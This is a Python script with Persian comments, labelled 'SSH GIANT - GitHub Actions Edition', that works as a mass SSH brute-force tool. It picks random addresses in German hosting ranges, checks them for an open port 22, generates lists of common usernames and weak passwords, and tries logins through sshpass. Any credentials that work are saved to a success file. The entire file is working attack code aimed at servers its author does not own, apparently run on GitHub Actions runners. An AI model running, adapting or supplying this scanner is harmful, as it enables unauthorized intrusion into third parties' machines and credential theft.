#!/usr/bin/env python3
import asyncio
import random
import ipaddress
import socket
import os
import sys
from datetime import datetime

# ------------------- تنظیمات -------------------
SSH_TIMEOUT = 2          # ثانیه برای اتصال SSH
MAX_WORKERS = 300        # تعداد کارگر همزمان (در اکشن می‌توان بالا برد)
TARGET_RATE = 500        # آرزوی ما، ولی عملاً به 50-100 می‌رسیم

# رنج‌های IPv4 معروف آلمان (Hetzner, Contabo, etc.)
GERMAN_RANGES = [
    "136.243.0.0/16", "5.9.0.0/16", "78.46.0.0/15", "85.10.192.0/18",
    "88.198.0.0/16", "95.216.0.0/15", "116.203.0.0/16", "138.201.0.0/16",
    "144.76.0.0/16", "148.251.0.0/16", "157.90.0.0/16", "159.69.0.0/16",
    "168.119.0.0/16", "176.9.0.0/16", "188.40.0.0/16", "193.47.80.0/20",
    "213.133.96.0/19"
]

COMMON_USERNAMES = [
    "root", "admin", "user", "ubuntu", "debian", "centos", "test",
    "oracle", "postgres", "mysql", "www-data", "backup", "pi", "azureuser"
]

BASE_PASSWORDS = [
    "123456", "password", "123456789", "qwerty", "abc123", "admin", "root",
    "toor", "Passw0rd", "P@ssw0rd", "welcome", "login"
]

# ------------------- توابع رانرها -------------------
def generate_ips_from_ranges(ranges, max_ips=3000):
    """تولید حداکثر max_ips آی‌پی تصادفی از رنج‌های داده شده"""
    all_ips = set()
    for r in ranges:
        try:
            net = ipaddress.ip_network(r)
            hosts = list(net.hosts())
            if not hosts:
                continue
            sample = min(80, len(hosts))  # از هر رنج حداکثر 80 تا
            for ip in random.sample(hosts, sample):
                all_ips.add(str(ip))
                if len(all_ips) >= max_ips:
                    break
            if len(all_ips) >= max_ips:
                break
        except:
            continue
    return list(all_ips)[:max_ips]

async def check_port_22(ip, timeout=1.5):
    """TCP connect به پورت 22 برای تشخیص زنده بودن (جایگزین پینگ)"""
    try:
        loop = asyncio.get_running_loop()
        conn = asyncio.open_connection(ip, 22)
        await asyncio.wait_for(conn, timeout=timeout)
        return True
    except:
        return False

async def scan_alive_ips(ip_list):
    """اسکن همزمان پورت 22 روی همه آی‌پی‌ها"""
    tasks = [check_port_22(ip) for ip in ip_list]
    results = await asyncio.gather(*tasks)
    return [ip for ip, alive in zip(ip_list, results) if alive]

def generate_usernames():
    with open("usernames.txt", "w") as f:
        for u in COMMON_USERNAMES:
            f.write(u + "\n")
    print(f"[+] {len(COMMON_USERNAMES)} usernames saved.")

def generate_passwords(count=800):
    passwords = set(BASE_PASSWORDS)
    while len(passwords) < count:
        base = random.choice(BASE_PASSWORDS)
        suffix = str(random.randint(1, 9999))
        passwords.add(base + suffix)
        passwords.add(base + "_" + suffix)
    passwords = list(passwords)[:count]
    with open("passwords.txt", "w") as f:
        for p in passwords:
            f.write(p + "\n")
    print(f"[+] {len(passwords)} passwords saved.")

async def test_ssh(ip, username, password, semaphore, stop_event):
    if stop_event.is_set():
        return None
    async with semaphore:
        cmd = (
            f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
            f"-o ConnectTimeout={SSH_TIMEOUT} -o PubkeyAuthentication=no "
            f"-o PreferredAuthentications=password -o LogLevel=ERROR "
            f"{username}@{ip} exit"
        )
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            await asyncio.wait_for(proc.wait(), timeout=SSH_TIMEOUT+1)
            if proc.returncode == 0:
                stop_event.set()
                return (ip, username, password)
        except:
            pass
        return None

async def main_attacker(alive_ips, usernames, passwords):
    total = len(alive_ips) * len(usernames) * len(passwords)
    print(f"[*] Total combinations: {total}")
    sem = asyncio.Semaphore(MAX_WORKERS)
    stop = asyncio.Event()
    tasks = []
    for ip in alive_ips:
        for user in usernames:
            for pwd in passwords:
                tasks.append(test_ssh(ip, user, pwd, sem, stop))
                if len(tasks) > 10000:  # جلوگیری از مصرف بیش از حد حافظه
                    break
            if len(tasks) > 10000:
                break
        if len(tasks) > 10000:
            break
    results = await asyncio.gather(*tasks)
    for res in results:
        if res:
            ip, user, pwd = res
            with open("success.txt", "w") as f:
                f.write(f"IP: {ip}\nUSER: {user}\nPASSWORD: {pwd}\n")
            print(f"\n🟢 SUCCESS: {ip} | {user} | {pwd}")
            return True
    return False

async def main():
    print("="*50)
    print("   SSH GIANT - GitHub Actions Edition")
    print(f"Start: {datetime.now()}")
    print("="*50)

    # Runner 1
    print("\n[Runner 1] Generating IPs from German ranges...")
    ips = generate_ips_from_ranges(GERMAN_RANGES, max_ips=2500)
    with open("all_ips.txt", "w") as f:
        for ip in ips:
            f.write(ip + "\n")
    print(f"[+] {len(ips)} IPs generated.")

    # Runner 2
    print("\n[Runner 2] Scanning alive IPs (port 22)...")
    alive = await scan_alive_ips(ips)
    with open("alive_ips.txt", "w") as f:
        for ip in alive:
            f.write(ip + "\n")
    print(f"[+] {len(alive)} IPs are alive.")

    if not alive:
        print("[!] No alive IPs found. Exiting.")
        return

    # Runner 3
    print("\n[Runner 3] Generating usernames...")
    generate_usernames()
    with open("usernames.txt") as f:
        usernames = [l.strip() for l in f if l.strip()]

    # Runner 4
    print("\n[Runner 4] Generating passwords...")
    generate_passwords(600)
    with open("passwords.txt") as f:
        passwords = [l.strip() for l in f if l.strip()]

    # Main Runner
    print("\n[Main Runner] Starting brute force... (MAX_WORKERS={})".format(MAX_WORKERS))
    success = await main_attacker(alive, usernames, passwords)

    if success:
        print("\n✅ Attack succeeded! Check success.txt artifact.")
    else:
        print("\n❌ No credentials found.")

    print(f"End: {datetime.now()}")

if __name__ == "__main__":
    # نصب sshpass در اکشن (اگر نبود)
    if os.system("command -v sshpass > /dev/null 2>&1") != 0:
        os.system("sudo apt update && sudo apt install -y sshpass")
    asyncio.run(main())
